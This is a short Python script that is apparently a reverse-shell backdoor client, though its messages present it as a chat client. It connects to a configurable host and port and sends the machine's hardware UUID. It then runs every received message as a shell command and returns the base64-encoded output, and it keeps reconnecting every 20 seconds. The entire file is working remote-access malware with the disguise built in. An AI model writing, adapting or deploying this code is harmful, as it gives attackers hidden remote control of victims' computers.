import socket
import subprocess
import base64
import os
import json
import time

HOST = '127.0.0.1'
PORT = 12345

def get_id():
    hwid = subprocess.run("wmic csproduct get uuid".split(" "), capture_output=True, shell=True)
    return hwid.stdout.splitlines()[2].decode("UTF-8").replace(" ", "")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print("Connected to the chat server.")

    sock.send(json.dumps({
        "HWID": get_id()
    }).encode())

    while True:
        try:
            message = sock.recv(1024).decode('utf-8', errors="replace")

            if message.startswith("cd "):
                path = message.split(" ")[1]
                try:
                    os.chdir(path)
                    sock.send(base64.b64encode(f"Directory has been changed to {os.getcwd()}".encode()))
                except:
                    sock.send(base64.b64encode(b"Failed to change directory!"))
            else:

                response = subprocess.run(message.split(" "), capture_output=True, shell=True)
                sock.sendall(base64.b64encode(response.stdout+response.stderr))
            if not message:
                # Server might have closed the connection
                print("Disconnected from chat.")
                break
            print(message)
        except:
            break

while True:
    try:
        main()
    except:
        print("Failed to connect / Disconnected; Retrying connect in 20 seconds!")
        time.sleep(20)
        continue
